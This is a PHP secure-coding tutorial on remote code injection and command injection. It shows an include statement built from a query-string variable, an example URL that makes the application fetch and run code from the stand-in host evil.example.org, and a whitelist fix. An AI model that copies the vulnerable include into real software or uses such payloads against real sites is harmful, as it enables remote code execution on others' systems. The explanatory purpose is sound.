##Filesystem Security
#### Remote Code Injection 
A remote code injection attack occurs when an attacker is able to cause your application to execute PHP code of his choosing. This can
have devastating consequences for both your application and your system. 

For example, many applications make use of query string variables such
as: ```http://example.org/?section=news``` to structure the application into
sections. One such application may use an include statement to include a
script to display the “news” section:
```php
include "{$_GET['section']}/data.inc.php";
```
When using the proper URL to access this section, the script will include the
file located at ```news/data.inc.php```. However, consider what might happen if
an attacker modified the query string to include harmful code located on a
remote site. The following URL illustrates how an attacker can do this:
```
http://example.org/?section=http%3A%2F%2Fevil.example.org%2Fattack.inc%3F
```
Now, the tainted section value is injected into the include statement,
effectively rendering it as:
```php
include "http://evil.example.org/attack.inc?/data.inc.php";
```
The application will include attack.inc, located on the remote server, which
treats ```/data.inc.php``` as part of the query string, thus effectively neutralizing
its effect within your script. Any PHP code contained in attack.inc is
executed and run, causing whatever harm the attacker intended.

It is easy to protect against it by
filtering all input and never using tainted data in an include or require
statement. In this example, filtering might be as simple as specifying a certain
set of expected values for section:
```php
$clean = array();
$sections = array('home', 'news', 'photos', 'blog');
if (in_array($_GET['section'], $sections)) {
  $clean['section'] = $_GET['section'];
} else {
  $clean['section'] = 'home';
}
```

####Command Injection
While PHP provides great power with the exec(), system(),
and passthru() functions, as well as the ` (backtick) operator, these must not
be used lightly, and it is important to take great care to ensure that attackers
cannot inject and execute arbitrary system commands.

Again, proper filtering
and escaping will mitigate the risk—a whitelist filtering approach that limits
the number of commands that users may execute works quite well here.
include $clean['section'] . "/data.inc.php";
